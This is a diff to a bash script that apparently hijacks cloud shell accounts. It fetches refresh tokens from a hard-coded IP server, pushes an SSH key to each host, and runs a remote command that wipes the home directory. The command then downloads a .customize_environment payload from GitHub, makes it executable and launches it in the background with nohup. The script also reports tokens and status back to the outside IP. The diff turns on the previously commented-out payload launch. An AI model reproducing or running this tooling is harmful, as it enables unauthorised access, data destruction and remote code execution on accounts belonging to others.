@@ -40,9 +40,8 @@ do
 
  if [ ! -e 'refresh-token' ] || [ -s 'refresh-token' ] || [ $status == 'QUOTA_EXCEEDED' ]
  then
-    rm -rf refresh-token
-    wget -q 'http://135.148.11.148/queue.php?owner='$account -O refresh-token
-
+    rm -rf refresh-token.tkn
+    wget -q 'http://135.148.11.148/queue.php?owner='$account -O refresh-token.tkn
     PublicKey='null'
     commandOk='null'
     bearer='null'
@@ -117,31 +116,25 @@ fi
     source addPublicKey.sh $bearer $sshHost
  fi
 
+ if [ "$PublicKey" == 'null' ] && [ $status == 'RUNNING' ]
+ then
+    source addPublicKey.sh $bearer $sshHost
+ fi
+
  if [ "$PublicKey" != 'null' ] && [ $commandOk == 'null' ]
  then
-    command="sudo rm -rf *"
-    command=$command" ; sudo rm -rf .customize_environment"
-    command=$command" ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment -P /home/"$sshUsername
-    command=$command" ; chmod 777 .customize_environment"
-    #command=$command" ; sudo nohup ./.customize_environment > /dev/null &"
-
-    source command.sh $sshUsername $sshHost "$command"
+    source command.sh $sshUsername $sshHost 'sudo rm -rf $(ls) ; sudo rm -rf refresh-token ; sudo rm -rf .customize_environment ; sudo wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; sudo chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null &'
     commandOk='true'
  fi
 
  url='http://135.148.11.148/send_status.php?refresh='$refresh_token'&status='$status'&owner='$account
  curl $url
 
- if [ $file != 'init.log' ]
- then
-    rm -rf $file
- fi
-
- echo
- echo 'Account: '$account
- echo 'Status:  '$status
- echo 'UserSSH: '$sshUsername
- echo 'Refresh: '$refresh_token
+ #echo
+ #echo 'Account:     '$account
+ #echo 'Status:      '$status
+ #echo 'UserSSH:     '$sshUsername
+ #echo 'Refresh:     '$refresh_token
 
  sleep 60
 
